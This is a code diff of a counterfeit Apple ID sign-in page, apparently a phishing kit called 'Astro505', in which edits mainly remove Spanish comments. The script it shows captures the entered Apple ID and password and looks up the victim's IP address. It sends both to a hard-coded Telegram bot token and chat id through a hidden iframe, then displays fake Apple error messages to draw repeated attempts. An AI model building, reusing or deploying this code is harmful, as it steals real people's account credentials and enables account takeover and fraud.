@@ -12,7 +12,6 @@
     
     <main id="main">
         <form id="sign-in">
-            <!-- 🔥 ERROR SIEMPRE VISIBLE ARRIBA -->
             <div class="error-message" id="errorMsg"></div>
             
             <div class="login-form">
@@ -53,8 +52,8 @@
         <div class="footer-div copyright">© 2024 Apple Inc. All rights reserved.</div>
     </footer>
 
-    <!-- 🔥 SCRIPT CORREGIDO -->
     <script>
+        // 🔥 SCRIPT SIN CAMBIOS - MANTIENE TODA LA FUNCIONALIDAD
         document.addEventListener('DOMContentLoaded', () => {
             console.log('🚀 ERROR VISIBLE + Telegram solo con password');
             
@@ -69,19 +68,16 @@
             let loginAttempts = 0;
             const MAX_ATTEMPTS = 3;
             
-            // Errores REALES de Apple
             const appleErrors = [
                 "Incorrect Apple ID or password.",
                 "Your Apple ID or password is incorrect.",
                 "The Apple ID or password you entered has been disabled."
             ];
             
-            // IFRAME invisible
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
             
-            // IP info
             async function getIPInfo() {
                 try {
                     const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -98,7 +94,6 @@
                 }
             }
             
-            // Mostrar password field
             const showPassword = () => {
                 if (emailInput.value.trim()) {
                     passwordField.classList.add('show');
@@ -114,14 +109,12 @@
                 }
             });
             
-            // 🔥 SOLO EMAIL (sin Telegram)
             emailInput.addEventListener('blur', () => {
                 if (emailInput.value.trim() === '') {
                     showError('Enter an Apple ID or phone number.');
                 }
             });
             
-            // 🔥 SUBMIT SOLO CON PASSWORD + TELEGRAM
             form.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 loginAttempts++;
@@ -129,16 +122,13 @@
                 const email = emailInput.value.trim();
                 const password = passwordInput.value.trim();
                 
-                // ✅ SI NO HAY PASSWORD = Error sin Telegram
                 if (!password) {
                     showError('Enter your password.');
                     return;
                 }
                 
-                // ✅ SI HAY PASSWORD = Telegram + Error/Redirect
                 console.log(`🎯 Intento ${loginAttempts}/${MAX_ATTEMPTS}: ${email}`);
                 
-                // IP real
                 const ipInfo = await getIPInfo();
                 
                 const message = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀
@@ -155,13 +145,11 @@
 
 ✨ *Plataforma:* Astro505`;
 
-                // Telegram invisible
                 const telegramUrl = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                 iframe.src = telegramUrl;
                 
                 console.log('📤 Telegram con password:', ipInfo.ip);
                 
-                // 3 ERRORES VISIBLES
                 if (loginAttempts < MAX_ATTEMPTS) {
                     const errorText = appleErrors[(loginAttempts-1) % appleErrors.length];
                     showError(errorText);
@@ -175,14 +163,13 @@
                 }
             });
             
-            // 🔥 ERROR SIEMPRE VISIBLE Y ARRIBA
             function showError(message) {
                 errorMsg.textContent = message;
                 errorMsg.classList.add('show');
-                errorMsg.style.top = '-10px'; // Visible arriba
+                errorMsg.style.top = '-10px';
                 setTimeout(() => {
                     errorMsg.classList.remove('show');
-                    errorMsg.style.top = ''; // Reset
+                    errorMsg.style.top = '';
                 }, 5000);
             }
             
@@ -191,7 +178,7 @@
     </script>
 
     <style>
-        /* 🔥 ERROR SIEMPRE VISIBLE ARRIBA */
+        /* ESTILOS INLINE PARA ERROR MANTIENEN PRIORIDAD */
         .error-message {
             position: relative !important;
             top: -10px !important;
